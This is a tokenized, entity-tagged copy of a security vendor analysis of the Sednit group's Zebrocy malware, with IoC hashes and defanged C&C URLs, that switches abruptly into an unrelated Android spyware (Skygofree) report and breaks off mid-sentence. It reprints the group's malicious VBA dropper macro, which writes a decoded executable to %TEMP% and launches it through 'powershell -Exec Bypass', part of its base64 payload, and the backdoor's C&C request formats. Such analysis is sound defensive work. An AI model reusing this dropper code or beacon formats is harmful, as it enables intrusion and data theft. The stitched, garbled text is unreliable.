Applications
(
VBA
)
,
exploits
or
even
using
Dynamic
Data
Exchange
(
DDE
)
.

At
the
end
of
2017
,
the
Sednit B_malware.infosteal
group
launched
two
campaigns
delivering
two
different
malicious
documents
.

The
first
was
named
Syria
–
New
Russia
provocations.doc
and
the
second
named
Note
Letter
Mary
Christmas
Card.doc
.

Figure
2
:
Zebrocy B_malware.backdoor
's
malicious
documents
Both
malicious
documents
contain
a
VBA
macro
that
creates
a
randomly-named
file
in
%
TEMP
%
.

The
malware
executable
is
then
decoded
and
written
into
this
file
,
which
is
then
executed
via
a
PowerShell
command
or
via
Scriptable
Shell
Objects
.

Sub
AutoClose
(
)
On
Error
Resume
Next
vAdd
=
''
For
I
=
1
To
8
vAdd
=
vAdd
+
Chr
(
97
+
Rnd
(
20
)
*
25
)
Next
vFileName
=
Environ
(
'temp
'
)
&
'\
'
+
vAdd
&
'.e
'
+
'x
'
&
'e
'
SaveNew
vFileName
,
UserForm1.Label1.Caption
Application.Run
'XYZ
'
,
vFileName
,
'WScript.Shell
'
End
Sub
Public
Function
XYZ
(
vF
,
vW
)
vStr
=
'powershell.exe
-nop
-Exec
Bypass
-Command
Start-Process
''
+
vF
+
''
;
'
Call
CreateObject(vW).Run(vStr
,
0
)
End
Function
32
33
34
35
36
37
[
...
]
TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2lu
[
...
]
Example
of
Visual
Basic
function
and
base64
encoded
first
stage
from
Syria
–
New
Russia
provocations.doc
document
.

Archives

Some
campaigns
have
used
an
archive
to
drop
the
first
stage
on
the
victim
computer
,
rather
than
Office
document
macros
.

The
archive
is
presumably
delivered
as
an
email
attachment
.

All
first
stage
of
the
Zebrocy B_malware.backdoor
family
are
executables
with
an
icon
and
a
document-like
filename
intended
to
trick
the
victim
as
shown
in
the
Figure3
.

Figure
3
:
Zebrocy B_malware.backdoor
first
stage
using
a
Word
document
icon
Delphi
downloader
A
Delphi
downloader
is
the
first
stage
of
the
Zebrocy B_malware.backdoor
family
,
although
we
have
seen
some
campaigns
from
the
Sednit B_malware.infosteal
group
using
the
AutoIt
stage
directly
without
using
this
downloader
.

Most
of
these
Delphi
downloader
binaries
use
Office
document
icons
or
other
icons
like
Windows
library
,
and
sometimes
these
samples
are
packed
with
UPX
.

The
purpose
of
this
stage
is
quite
straightforward
:
it
retrieves
a
maximum
of
information
from
the
victim
's
computer
.

When
the
malware
is
launched
,
a
splash
window
pops
up
with
a
bogus
error
message
and
the
filename
of
the
dropped
binary
.

For
example
,
if
the
filename
is
srsiymyw.exe
,
the
filename
that
appears
in
the
splash
window
will
be
srsiymyw.doc
(
see
Figure
4
)
.

The
pop-up
's
purpose
is
to
distract
the
user
so
that
he
won't
think
anything
unusual
is
happening
on
his
computer
.

Figure
4
:
Delphi
downloader
splash
window

In
fact
,
the
downloader
is
busy
creating
a
file
under
%
TEMP
%
with
a
filename
hardcoded
in
the
binary
(
although
at
this
stage
,
the
file
is
empty
)
.

Persistence
is
implemented
by
adding
a
Windows
registry
entry
under
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
with
the
path
of
the
hardcoded
filename
.

To
gather
information
,
the
malware
creates
a
new
process
using
the
Windows
API
CreateProcess
function
with
cmd.exe
/c
SYSTEMINFO
&
TASKLIST
as
lpCommandLine
argument
.

Once
the
information
is
retrieved
,
it
sends
the
result
via
a
HTTP
POST
request
to
the
C&C
server
hardcoded
in
the
binary
.

It
retries
until
it
receives
the
next
stage
.

POST
(
\/
[
a-zA-Z0-9\-\_\^\.]*){3}\.(php|dat)?fort=<SerialNumber_C
>
HTTP/1.0
Connection
:
keep-alive
Content-Type
:
application/x-www-form-urlencoded
Content-Length
:
xxxx
Host
:
<
ip_address
>
Accept
:
text/html
,
*/*
Accept-Encoding
:
identity
User-Agent
:
Mozilla
v5.1
(
Windows
NT
6.1
;
rv:6.0.1
)
Gecko/20100101
Firefox/6.0.1
pol=MM/DD/YYYY
%
20HH
:
MM
:
SS
%
20
(
AM|PM
)
%
0D
%
0A
<
DriveListing
>
%
0D
%
0A
%
0D
%
0A
<
Path_to_the_binary
>
%
0D
%
0A
%
0D
%
[
...
]

Delphi
downloader
HTTP
POST
request

Once
the
request
has
been
sent
,
the
C&C
server
responds
by
sending
the
next
stage
,
if
the
target
is
considered
interesting
by
the
operator
.

The
time
elapsing
between
the
sending
of
the
report
and
the
receipt
of
the
payload
is
a
few
hours
.

This
next
stage
is
written
into
the
file
created
earlier
and
executed
.

AutoIt
downloader

The
AutoIt
downloader
is
another
layer
of
the
reconnaissance
phase
during
an
infection
of
the
victim
computer
.

From
this
point
onwards
,
two
scenarios
are
possible
:
in
the
first
one
,
the
Delphi
downloader
is
the
first
stage
and
the
second
stage
–
which
is
the
AutoIt
downloader
–
is
a
lightweight
downloader
.

In
the
other
scenario
,
the
AutoIt
downloader
is
the
first
stage
and
it
has
all
functionalities
of
the
Delphi
downloader
and
even
more
.

When
the
AutoIt
downloader
is
the
first
stage
it
performs
many
reconnaissance
functions
.

Even
if
this
one
shares
some
similarities
with
the
Delphi
downloader
,
such
as
the
persistence
mechanism
and
the
splash
window
,
it
adds
more
granularity
to
the
reconnaissance
phase
than
that
of
the
Delphi
downloader
.

Here
is
a
non-exhaustive
list
of
its
capabilities
:
Detect
sandbox
and
virtual
environment
Get
list
of
installed
software
(
via
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
)
Get
Windows
version
(
32-bit
or
64-bit
)
Get
the
process
list
Get
hard
drive
information
Get
screenshot
Get
various
information
about
the
victim
computer
using
Windows
Management
Instrumentation
(
WMI
)
objects
,
probably
inspired
by
code
from
this
GitHub
repository
Depending
on
the
previous
stage
,
the
name
of
the
AutoIt
binary
is
different
.

If
the
malware
is
dropped
as
the
first
stage
,
it
has
a
document-like
name
.

Otherwise
it
is
given
the
name
hardcoded
in
the
Delphi
downloader
,
as
shown
in
Table
1
.

Table
1
:
AutoIt
binary
filenames
,
depending
of
the
first
stage
Table
1
:
AutoIt
binary
filenames
,
depending
of
the
first
stage
First
Stage
First
Stage
AutoIt
binary
Filenames
AutoIt
binary
Filenames
Delphi
downloader
Delphi
downloader
csrsvc.exe
Email
attachment
Email
attachment
Protocol
List_20160606.exe
The
purpose
of
this
stage
is
more
of
less
the
same
as
the
previous
one
.

There
are
many
different
versions
in
the
wild
but
all
of
them
include
at
least
the
code
to
achieve
the
following
:
Retrieve
the
serial
number
of
the
hard
drive
C
:
Use
network
functions
from
winhttp.dll
or
winhttp.au3
Execute
the
payload
received
from
the
C&C
server
In
the
same
way
that
the
Delphi
downloader
has
a
splash
window
,
the
AutoIt
also
has
a
splash
window
when
it
comes
from
an
email
attachment
–
the
AutoIt
is
the
first
stage
.

The
splash
screen
is
related
to
the
binary
icon
.

For
example
,
an
AutoIt
downloader
with
Adobe
Reader
as
an
icon
displays
a
splash
screen
saying
that
the
PDF
file
the
victim
would
be
expecting
to
be
displayed
is
corrupted
.

An
AutoIt
binary
with
a
Word
icon
will
display
the
following
popup
asking
for
a
password
.

The
password
is
not
considered
here
;
we
think
it
's
just
a
way
to
distract
the
victim
from
the
code
's
real
malicious
activity
.

Figure
5
:
AutoIt
downloader
Word
popup
Delphi
backdoor

The
Delphi
backdoor
is
the
final
stage
of
the
Zebrocy B_malware.backdoor
chain
of
components
.

We
have
seen
Zebrocy B_malware.backdoor
downloading
the
Sednit B_malware.infosteal
group
's
flagship
backdoor
,
Xagent
,
in
the
past
.

Unlike
the
previous
components
,
this
one
has
an
internal
version
number
that
does
n't
seem
to
be
related
to
a
specific
campaign
.

This
version
number
has
evolved
over
time
,
as
shown
in
Table
2
:
Table
2
:
Delphi
backdoor
internal
version
history

Table
2
:
Delphi
backdoor
internal
version
history
PE
timestamp
PE
timestamp
version
version
2015-12-28
2016-01-06
2016-01-25
2016-02-03
2016-03-14
2016-04-08
2.1
2.2
2.3
2.4
2.5
3.0
2016-04-26
2016-06-01
2016-09-08
2016-12-15
2017-06-01
2017-09-26
2017-10-12
2017-11-12
2017-12-26
2018-01-09
2017-12-18
2018-01-09
2018-01-16
2018-01-18

Table
2
:
Delphi
backdoor
internal
version
history

Table
2
:
Delphi
backdoor
internal
version
history

3.2
4.4
5.0
5.1
7.0
8.0
8.1
8.2
8.5
8.6
10.1
10.2
10.3
11.0
2018-02-07
2018-03-05
2018-03-06
2018-03-14
2018-03-28
Table
2
:
Delphi
backdoor
internal
version
history

Table
2
:
Delphi
backdoor
internal
version
history
12.0
13.0
13.1
14.0
14.1
Notice
that
we
don't
have
the
full
visibility
and
we
may
have
missed
some
versions
of
the
backdoor
.

Besides
,
there
is
some
overlap
between
versions
meaning
that
some
older
versions
are
still
used
at
the
same
time
as
newer
versions
.

In
the
next
few
paragraphs
we
will
highlight
some
differences
seen
in
the
malware
during
its
evolution
.

The
backdoor
embeds
a
block
of
configuration
.

The
configuration
values
change
from
one
sample
to
another
,
but
the
list
of
configurable
items
stays
the
same
.

However
,
the
way
in
which
the
configuration
data
are
stored
in
the
malware
sample
has
evolved
over
time
.

The
first
versions
of
the
backdoor
embedded
the
configuration
data
in
plaintext
,
as
shown
in
Figure
6
.

Figure
6
:
Delphi
backdoor
plaintext
configuration
data
Then
,
in
later
versions
,
the
malware
's
authors
encoded
the
configuration
data
as
hexadecimal
strings
,
as
shown
in
Figure
7
.

Figure
7
:
Delphi
backdoor
encoded
configuration
data
In
the
latest
versions
,
the
configuration
data
is
encrypted
in
the
resources
using
the
AES
algorithm
.

Older
versions
stored
it
in
the
.text
section
.

The
configuration
data
contains
:
AES
keys
to
communicate
with
the
C&C
server
URLs
with
paths
differing
from
one
sample
to
another
The
version
of
the
malware
The
windows
registry
key/value
that
ensures
the
persistence
of
the
backdoor
Path
where
temporary
files
are
store
(
%
APPDATA
%
)
The
names
of
hidden
directories
to
be
created
to
store
temporary
files
:
the
directory
filenames
are
concatenated
with
the
environment
variable
(
%
APPDATA
%
)
Once
the
malware
is
set
up
,
it
executes
callback
functions
via
the
Windows
API
function
SetTimer
.

These
callbacks
allow
the
operator
to
handle
many
features
and
commands
of
the
backdoor
.

Take
a
screenshot
of
the
Desktop
of
the
victim
Capture
keystrokes
List
drives/network
resources
Read/write
into
Windows
registry
Copy/move/delete
a
file
system
object
Execute
files
or
create
scheduled
tasks
The
number
of
commands
handled
by
the
backdoor
–
about
30
–
differs
from
one
version
to
another
.

To
communicate
with
the
C
&
C
server
,
the
backdoor
stores
the
report
of
these
functions
into
a
temporary
file
.

Then
it
will
read
the
content
of
the
temporary
file
and
send
it
on
.

These
temporary
files
are
stored
in
one
of
the
hidden
directories
created
during
the
set-up
phase
.

123456789
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
POST
(
\/
[
a-zA-Z0-9\-\_\^\.]*){3}\.(php|dat
)
.

HTTP/1.0
Connection
:
keep-alive
Content-Type
:
multipart/form-data
;
boundary=
--
--
--
--
<
mmddyyhhnnsszzz
>
Content-Length
:
<
N
>
Host
:
<
ip_address
>
Accept
:
text/html
,
*/*
Accept-Encoding
:
identity
User-Agent
:
Mozilla/3.0
(
compatible
;
Indy
Library
)
--
--
--
--
--
<
mmddyyhhnnsszzz
>
Content-Disposition
:
form-data
;
name='userfile
'
;
filename=
'
%
APPDATA
%
\Microsoft\<directories>\<tempfilename>.tmp
'
Content-Type
:
<
tempfilename_hex_encoded>.tmp
<
tempfilename
content
>
--
--
--
--
--
<
mmddyyhhnnsszzz
>
-Delphi
backdoor
POST
request

The
tempfilename
content
is
the
output
of
whichever
commands
are
executed
.

The
content
is
encrypted
using
the
AES-256-ECB
algorithm
with
the
first
AES
key
from
the
configuration
data
,
then
the
output
is
hexadecimal
encoded
.

The
contents
sent
to
the
C
&
C
server
vary
from
one
command
to
another
,
but
all
contains
at
least
the
HDD
serial
number
and
the
first
four
bytes
of
the
computer
name
.

For
example
,
HELLO
corresponds
to
the
first
packet
sent
by
the
backdoor
to
establish
contact
with
the
C
&
C
server
.

As
shown
below
it
contains
the
date
when
the
task
was
launched
,
the
Delphi
backdoor
's
internal
version
number
,
the
HDD
serial
number
,
the
computer
name
(
first
four
bytes
)
,
the
command
and
the
date
when
the
backdoor
was
executed
.

Start
:
1/4/2018
1:37:00
PM
–
[
<
vx.x>]:42424242ESET-HELLO-[2018-04-04
01-37-00]-315.TXT
.

The
second
AES
key
in
the
configuration
data
is
used
to
decrypt
the
answer
from
the
C
&
C
server
.

Like
Seduploader B_malware.backdoor
,
this
backdoor
is
used
to
deploy
Xagent
on
victim
machines
apparently
deemed
'
interesting
'
by
the
operators
after
the
reconnaissance
phase
.

Summary
A
component
written
in
Delphi
is
nothing
new
for
the
Sednit B_malware.infosteal
group
,
which
has
already
used
this
language
for
Downdelph
.

However
,
even
if
this
latest
component
has
nothing
else
in
common
with
Downdelph
'
technically
speaking
'
,
there
are
some
points
of
interest
worth
mentioning
.

The
deployment
methods
are
the
same
,
both
being
delivered
as
an
email
attachment
.

We
saw
Downdelph
for
the
last
time
in
September
2015
,
and
the
first
sample
of
Zebrocy B_malware.backdoor
we
saw
in
the
wild
was
dated
November
2015
.

Both
are
written
in
Delphi
.

We
can
hypothesize
that
the
Sednit B_malware.infosteal
group
abandoned
one
component
and
started
to
develop
a
new
one
.

One
thing
that
does
n't
change
for
the
group
,
however
,
are
the
mistakes
they
made
:
The
name
of
the
scheduled
task
:
Windiws
The
function
name
that
retrieves
system
information
in
the
AutoIt
downloader
is
_SOFWARE
(
)
Mary
instead
of
Merry
in
Note
Letter
Mary
Christmas
Card.doc
The
byte
arrays
used
by
the
Delphi
backdoor
as
AES-256
keys
are
38
bytes
long
instead
of
32
bytes
.

It
's
not
a
spelling
error
but
probably
due
to
a
lack
of
attention
.

We
have
seen
Zebrocy B_malware.backdoor
being
heavily
used
by
the
Sednit B_malware.infosteal
group
over
the
last
two
years
.

Our
analysis
of
the
many
new
variants
that
appeared
on
a
regular
basis
since
2017
clearly
indicates
that
Zebrocy B_malware.backdoor
is
being
actively
maintained
and
improved
by
its
author
(
s
)
.

We
can
consider
it
as
one
of
the
stable
,
mature
tools
in
Sednit B_malware.infosteal
's
arsenal
,
a
tool
that
deserves
to
be
monitored
closely
.

IoCs
Malicious
documents
Malicious
documents
SHA-1
SHA-1
ESET
Detection
name
ESET
Detection
name
Filename
Filename
4f07d18475601d0492cbf678ee0f0860c729910e B_hash
VBA/TrojanDropper.Agent.YC
f10b2c052afc07e2dec9dbe816031059fdc900ba B_hash
VBA/TrojanDropper.Agent.AAK
Note
Letter
Mary
Christmas
Card.doc
Syria
-
New
Russia
provocations.doc
Delphi
downloader
Delphi
downloader
SHA-1
SHA-1
ESET
Detection
name
ESET
Detection
name
00b39f2deaf1f1fc29e5acb63f4d1100e04fd701 B_hash
Win32/TrojanDownloader.Delf.CFS
07e44b44c5f1043d16f6011a2cf0d2e7c5a52787 B_hash
Win32/TrojanDownloader.Delf.CFG
0f946f619ae8e2181a5bd76c8af03347742765c6 B_hash
Win32/TrojanDownloader.Delf.CGW
2900ed173a9f5dc99f905942a6be595cc6f03387 B_hash
Win32/TrojanDownloader.Delf.CFG
2b5a7f4e054d0130883c8821b629121e0228bf54 B_hash
Win32/TrojanDownloader.Delf.CIP
36b5e59a01e7f244d4a3bbb539e57aa468115dc8 B_hash
Win32/TrojanDownloader.Delf.CGB
37bd951c483da057337ef8f38d6e48051cbb39d0 B_hash
Win32/TrojanDownloader.Delf.CHC
41686703ce9e9aec64b6ad1c516746751219bc62 B_hash
Win32/TrojanDownloader.Delf.CFS
4e6470f4a245efaa138c8c6eedb046e916706383 B_hash
Win32/TrojanDownloader.Delf.CGW
54b14fc84f152b43c63babc46f2597b053e94627 B_hash
Win32/TrojanDownloader.Delf.CGB
afd5a60b7fff4deea15f7011339ad2cc2987a937 B_hash
Win32/TrojanDownloader.Delf.CGW
SHA-1
SHA-1
d4ab51bc5c26183771e3358d76e348943f9dd2fc B_hash
ESET
Detection
name
ESET
Detection
name
Win32/TrojanDownloader.Delf.CGB
d6fdc72792ee736b8d606d40d72cb89d6e8a3e18 B_hash
Win32/TrojanDownloader.Delf.CFU
AutoIt
downloader
AutoIt
downloader
SHA-1
SHA-1
ESET
Detection
name
ESET
Detection
name
0cd61d367dd0b13000774ab77abf3d4cfb713c8e B_hash
Win32/TrojanDownloader.Autoit.ODO
185ab7a371b58ff367c155ec0dabe28842d340bd B_hash
Win32/TrojanDownloader.Autoit.OBG
267abd7105ac26d5cb6ecb96292f83708f64b994 B_hash
Win32/TrojanDownloader.Autoit.OHC
4a6dcbccab5344388b331d543cc2260ca531c7ca B_hash
Win32/Autoit.CT
62dcf2f33ecc6014fa9a10f4e9ac9fd9bb0a6d23 B_hash
Win32/TrojanDownloader.Autoit.OCO
b8b847d3d0139db68dba730b3424b29dcb40b3c7 B_hash
Win32/TrojanDownloader.Autoit.OMA
c0271dbb02636402742c390ffbeee6418f696668 B_hash
Win32/TrojanDownloader.Autoit.OMB
d379b94a3eb4fd9c9a973f64d436d7fc2e9d6762 B_hash
Win32/Spy.Autoit.EI
dabeadf0a9af3a8a0802f8445670806cd7671b1d B_hash
Win32/TrojanDownloader.Autoit.OCI
Delphi
backdoor
Delphi
backdoor
SHA-1
SHA-1
ESET
Detection
name
ESET
Detection
name
SHA-1
SHA-1
SHA-1
SHA-1
0983d940ba42135106bf7a1e87ed5a1975fc7ead B_hash
ESET
Detection
name
ESET
Detection
name
ESET
Detection
name
ESET
Detection
name
Win32/Delf.BFF
226083c7190f1a939d5b7b352400450690d59f65 B_hash
Win32/Delf.BDW
245868d6805c66181808973e93f23293d6d2f7d1 B_hash
Win32/Delf.BDT
2c01ae417e5de213845b1ed46d4e82d45edd598d B_hash
Win32/Delf.BBP
4ccbe222bd97dc229b36efaf52520939da9d51c8 B_hash
Win32/Delf.BFC
51ae516792570bcd069a657c27859cd3fdc07d00 B_hash
Win32/Delf.BBP
55179f0c6bce5a37311a44efe3f9845096c09668 B_hash
Win32/Delf.AWE
6fd7ce97061169b835ea77976651b5bf20aca4ef B_hash
Win32/TrojanDownloader.Delf.BRV
7349843e4dac1226ad6ce3e3cda8c389dd599548 B_hash
Win32/TrojanDownloader.Delf.BRV
7b5c223a4968cc2190c1b5444cad47187d27ec50 B_hash
Win32/TrojanDownloader.Delf.BRV
83882e13b369986b513f4aae245c112b82ec2097 B_hash
Win32/Delf.BEB
8aedf7a462024acf72d708c89230e4f02d94bc78 B_hash
Win32/Delf.BDT
8bd56b580974ae195e9f92b3aa525547d33434c1 B_hash
Win32/Delf.BEC
9beacd8e145fa01e16409d44d8b9470af6c7afd8 B_hash
SHA-1
SHA-1
a172fe6e91170f858c8ce5d734c094996bdf83d0 B_hash
Win32/Delf.BBP
ESET
Detection
name
ESET
Detection
name
Win32/Delf.BDT
ae93b6ec2d56512a1c7e8c053d2a6ce6fdfb7e4c B_hash
Win32/Delf.BEX
c08d89c7f7be69d5d705d4ac7e24e8f48e22faaf B_hash
Win32/Delf.BDW
c2f3ca699aef3d226a800c2262efdca1470e00dc B_hash
Win32/Delf.AVP
cdf9c24b86bc9a872035dcf3f53f380c904ed98b B_hash
Win32/Delf.BEH
f63e29621c8becac47ae6eac7bf9577bd0a37b73 B_hash
Win32/Delf.AVT
fea8752d90d2b4f0fc49ac0d58d62090782d8c5b B_hash
Win32/Delf.BFN
URLs
http://142[.]0.68.2/test-update-16-8852418/temp727612430/checkUpdate89732468.php B_url.unknown
http://142[.]0.68.2/test-update-17-8752417/temp827612480/checkUpdate79832467.php B_url.unknown
http://185[.]25.50.93/syshelp/kd8812u/protocol.php B_url.unknown
http://185[.]25.50.93/tech99-04/litelib1/setwsdv4.php B_url.unknown
http://185[.]25.50.93/techicalBS391-two/supptech18i/suppid.php B_url.unknown
http://185[.]25.51.114/get-help-software/get-app-c/error-code-lookup.php B_url.unknown
http://185[.]25.51.164/srv_upd_dest_two/destBB/en.php B_url.unknown
http://185[.]25.51.198/get-data/searchId/get.php B_url.unknown
http://185[.]25.51.198/stream-upd-service-two/definition/event.php B_url.unknown
http://185[.]77.129.152/wWpYdSMRulkdp/arpz/MsKZrpUfe.php B_url.unknown
http://188[.]241.68.121/update/dB-Release/NewBaseCheck.php B_url.unknown
http://194[.]187.249.126/database-update-centre/check-system-version/id=18862.php B_url.unknown
http://194[.]187.249.126/security-services-DMHA-group/info-update-version/id77820082.php B_url.unknown
http://213[.]103.67.193/ghflYvz/vmwWIdx/realui.php B_url.unknown
http://213[.]252.244.219/client-update-info/version-id/version333.php B_url.unknown
http://213[.]252.244.219/cumulative-security-update/Summary/details.php B_url.unknown
http://213[.]252.245.132/search-release/Search-Version/crmclients.php B_url.unknown
http://213[.]252.245.132/setting-the-os-release/Support-OS-release/ApiMap.php B_url.unknown
http://220[.]158.216.127/search-sys-update-release/base-sync/db7749sc.php B_url.unknown
http://222[.]15.23.121/gft_piyes/ndhfkuryhs09/fdfd_iunb_hhert_ps.php B_url.unknown
http://46[.]102.152.127/messageID/get-data/SecurityID.php B_url.unknown
http://46[.]183.223.227/services-check-update/security-certificate-11-554/CheckNow864.php B_url.unknown
http://80[.]255.6.5/daily-update-certifaicates52735462534234/update-15.dat B_url.unknown
http://80[.]255.6.5/LoG-statistic8397420934809/date-update9048353094c/StaticIpUpdateLog23741033.php B_url.unknown
http://86[.]105.18.106/apps.update/DetailsID/clientPID-118253.php B_url.unknown
http://86[.]105.18.106/data-extract/timermodule/update-client.php B_url.unknown
http://86[.]105.18.106/debug-info/pluginId/CLISD1934.php B_url.unknown
http://86[.]105.18.106/ram-data/managerId/REM1234.php B_url.unknown
http://86[.]105.18.106/versionID/Plugin0899/debug-release01119/debug-19.app B_url.unknown
http://86[.]105.18.111/UpdateCertificate33-33725cnm^BB/CheckerNow-saMbA-99-36^11/CheckerSerface^8830-11.php B_url.unknown
http://86[.]106.131.177/srvSettings/conf4421i/support.php B_url.unknown
http://86[.]106.131.177/SupportA91i/syshelpA774i/viewsupp.php B_url.unknown
http://89[.]249.65.166/clientid-and-uniqued-r2/the-differenceU/Events76.php B_url.unknown
http://89[.]249.65.166/int-release/check-user/userid.php B_url.unknown
http://89[.]249.65.234/guard-service/Servers-ip4/upd-release/mdb4 B_url.unknown
http://89[.]40.181.126/verification-online/service.911-19/check-verification-88291.php B_url.unknown
http://89[.]45.67.153/grenadLibS44-two/fIndToClose12t3/sol41.php B_url.unknown
http://89[.]45.67.153/supportfsys/t863321i/func112SerErr.php B_url.unknown
http://93[.]113.131.117/KB7735-9927/security-serv/opt.php B_url.unknown
http://93[.]113.131.155/Verifica-El-Lanzamiento/Ayuda-Del-Sistema/obtenerId.php B_url.unknown
http://93[.]115.38.132/wWpYdSMRulkdp/arpz/MsKZrpUfe.php B_url.unknown
http://rammatica[.]com/QqrAzMjp/CmKjzk/EspTkzmH.php B_url.unknown
http://rammatica[.]com/QqrAzMjp/CmKjzk/OspRkzmG.php B_url.unknown

ESET
Research
24
Apr
2018
-
02:56PM
ESET
Research
24
Apr
2018
-
02:56PM

Similar
Articles
MALWARE
MALWARE
MALWARE
MALWARE
MALWARE
MALWARE
MALWARE
MALWARE
Firms
using
WebEx
at
risk
of
poisoned
Flash
attacks
Fake
or
not
fake
–
that
is
the
question
Beware
ad
slingers
thinly
disguised
as
security
apps
Glupteba
is
no
longer
part
of
Windigo
Discussion

Home
Home
About
Us
About
Us
Contact
Us
Contact
Us
Sitemap
Sitemap
Our
Experts
Our
Experts
ESET
ESET
Research
Research
How
To
How
To
Categories
Categories
RSS
Configurator
RSS
Configurator
News
Widget
News
Widget
in
the
footsteps
of
HackingTeam
By
Nikita
Buchka
,
Alexey
Firsh
on
January
16
,
2018
.

10:00
am
At
the
beginning
of
October
2017
,
we
discovered
new
Android
spyware
with
several
features
previously
unseen
in
the
wild
.

In
the
course
of
further
research
,
we
found
a
number
of
related
samples
that
point
to
a
long-term
development
process
.

We
believe
the
initial
versions
of
this
malware
were
created
at
least
three
years
ago
–
at
the
end
of
2014
.

Since
then
,
the
implant
's
functionality
has
been
improving
and
remarkable
new
features
implemented
,
such
as
the
ability
to
record
audio
surroundings
via
the
microphone
when
an
infected
device
is
in
a
specified
location
;
the
stealing
of
WhatsApp
messages
via
Accessibility
Services
;
and
the
ability
to
connect
an
infected
device
to
Wi-Fi
networks
controlled
by
cybercriminals
.

We
observed
many
web
landing
pages
that
mimic
the
sites
of
mobile
operators
and
which
are
used
to
spread
the
Android
implants
.

These
domains
have
been
registered
by
the
attackers
since
2015
.

According
to
our
telemetry
,
that
was
the
year
the
distribution
campaign
was
at
its
most
active
.

The
activities
continue
:
the
most
recently
observed
domain
was
registered
on
October
31
,
2017
.

Based
on
our
KSN
statistics
,
there
are
several
infected
individuals
,
exclusively
in
Italy
.

Moreover
,
as
we
dived
deeper
into
the
investigation
,
we
discovered
several
spyware
tools
for
Windows
that
form
an
implant
for
exfiltrating
sensitive
data
on
a
targeted
machine
.

The
version
we
found
was
built
at
the
beginning
of
2017
,
and
at
the
moment
we
are
not
sure
whether
this
implant
has
been
used
in
the
wild
.

We
named
the
malware
Skygofree B_malware.backdoor
,
because
we
found
the
word
in
one
of
the
domains*
.

Malware
Features
Android
According
to
the
observed
samples
and
their
signatures
,
early
versions
of
this
Android
malware
were
developed
by
the
end
of
2014
and
the
campaign
has
remained
active
ever
since
.

Signature
of
one
of
the
earliest
versions
The
code
and
functionality
have
changed
numerous
times
;
from
simple
unobfuscated
malware
at
the
beginning
to
sophisticated
multi-stage
spyware
that
gives
attackers
full
remote
control
of
the
infected
device
.

We
have
examined
all
the
detected
versions
,
including
the
latest
one
that
is
signed
by
a
certificate
valid
from
September
14
,
2017
.

The
implant
provides
the
ability
to
grab
a
lot
of
exfiltrated
data
,
like
call
records
,
text
messages
,
geolocation
,
surrounding
audio
,
calendar
events
,
and
other
memory
information
stored
on
the
device
.

After
manual
launch
,
it
shows
a
fake
welcome
notification
to
the
user
:
Dear
Customer
,
we
're
updating
your
configuration
and
it
will
be
ready
as
soon
as
possible
.

At
the
same
time
,
it
hides
an
icon
and
starts
background
services
to
hide
further
actions
from
the
user
.

Service
Name
Purpose
AndroidAlarmManager
Uploading
last
recorded
.amr
audio
AndroidSystemService
Audio
recording
AndroidSystemQueues
Location
tracking
with
movement
detection
ClearSystems
GSM
tracking
(
CID
,
LAC
,
PSC
)
ClipService
Clipboard
stealing
AndroidFileManager
Uploading
all
exfiltrated
data
AndroidPush
XMPP
С
&
C
protocol
(
url.plus:5223
)
RegistrationService
Registration
on
C
&
C
via
HTTP
(
url.plus/app/pro/
)
Interestingly
,
a
self-protection
feature
was
implemented
in
almost
every
service
.

Since
in
Android
8.0
(
SDK
API
26
)
the
system
is
able
to
kill
idle
services
,
this
code
raises
a
fake
update
notification
to
prevent
it
:
Cybercriminals
have
the
ability
to
control
the
implant
via
HTTP
,
XMPP
,
binary
SMS
and
FirebaseCloudMessaging
(
or
GoogleCloudMessaging
in
older
versions
)
protocols
.

Such
a
diversity
of
protocols
gives
the
attackers
more
flexible
control
.

In
the
latest
implant
versions
there
are
48
different
commands
.

You
can
find
a
full
list
with
short
descriptions
in
the
Appendix
.

Here
are
some
of
the
most
notable
:
'
geofence
'
–
this
command
adds
a
specified
location
to
the
implant
's
internal
database
and
when
it
matches
a
device
's
current
location
the
malware
triggers
and
begins
to
record
surrounding
audio
.

'
social
'
–
this
command
that
starts
the
'
AndroidMDMSupport
'
service
–
this
allows
the
files
of
any
other
installed
application
to
be
grabbed
.

The
service
name
makes
it
clear
that
by
applications
the
attackers
mean
MDM
solutions
that
are
business-specific
tools
.

The
operator
can
specify
a
path
with
the
database
of
any
targeted
application
and
server-side
PHP
script
name
for
uploading
.

Several
hardcoded
applications
targeted
by
the
MDM-grabbing
command
'wifi
'
–
this
command
creates
a
new
Wi-Fi
connection
with
specified
configurations
from
the
command
and
enable
Wi-Fi
if
it
is
disabled
.

So
,
when
a
device
connects
to
the
established
network
,
this
process
will
be
in
silent
and
automatic
mode
.

This
command
is
used
to
connect
the
victim
to
a
Wi-Fi
network
controlled
by
the
cybercriminals
to
perform
traffic
sniffing
and
man-in-the-middle
(
MitM
)
attacks
.

addWifiConfig
method
code
fragments
'camera
'
–
this
command
records
a
video/capture
a
photo
using
the
front-facing
camera
when
someone
next
unlocks
the
device
.

Some
versions
of
the
Skygofree B_malware.backdoor
feature
the
self-protection
ability
exclusively
for
Huawei
devices
.

There
is
a
'protected
apps
'
list
in
this
brand
's
smartphones
,
related
to
a
battery-saving
concept
.

Apps
not
selected
as
protected
apps
stop
working
once
the
screen
is
off
and
await
re-activation
,
so
the
implant
is
able
to
determine
that
it
is
running
on
a
Huawei
device
and
add
itself
to
this
list
.

Due
to
this
feature
,
it
is
clear
that
the
developers
paid
special
attention
to
the
work
of
the
implant
on
Huawei
devices
.

Also
,
we
found
a
debug
version
of
the
implant
(
70a937b2504b3ad6c623581424c7e53d
)
that
contains
interesting
constants
,
including
the
version
of
the
spyware
.

Debug
BuildConfig
with
the
version
After
a
deep
analysis
of
all
discovered
versions
of
Skygofree B_malware.backdoor
,
we
made
an
approximate
timeline
of
the
implant
's
evolution
.

Mobile
implant
evolution
timeline

However
,
some
facts
indicate
that
the
APK
samples
from
stage
two
can
also
be
used
separately
as
the
first
step
of
the
infection
.

Below
is
a
list
of
the
payloads
used
by
the
Skygofree B_malware.backdoor
implant
in
the
second
and
third
stages
.

Reverse
shell
payload

The
reverse
shell
module
is
an
external
ELF
file
compiled
by
the
attackers
to
run
on
Android
.

The
choice
of
a
particular
